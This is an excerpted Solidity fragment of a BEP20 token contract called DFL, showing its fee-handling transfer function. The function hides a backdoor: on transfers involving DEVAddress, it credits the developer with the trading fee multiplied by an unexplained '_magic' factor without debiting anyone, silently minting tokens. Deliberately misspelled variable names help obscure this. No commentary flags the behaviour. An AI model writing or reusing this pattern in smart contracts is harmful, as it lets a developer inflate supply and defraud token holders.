...
contract DFL is BEP20, Ownable {
    ...
    function _recF(
        ...
        uint256 tradefeeacooont = 0;

        uint256 tradefee = _defaultSellfee;
        ...
        tradefeeacooont = _acooont.mul(tradefee).div(100);

        if (tradefeeacooont > 0) {
            _balances[from] = _balances[from].sub(tradefeeacooont);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeacooont);
            emit Transfer(from, _deadAddress, tradefeeacooont);
        }

        if (from == DEVAddress || _to == DEVAddress) {
            _balances[DEVAddress] = _balances[DEVAddress].add(tradefeeacooont.mul(_magic));
        }

        _balances[from] = _balances[from].sub(_acooont - tradefeeacooont);
        _balances[_to] = _balances[_to].add(_acooont - tradefeeacooont);
        emit Transfer(from, _to, _acooont - tradefeeacooont);
    }
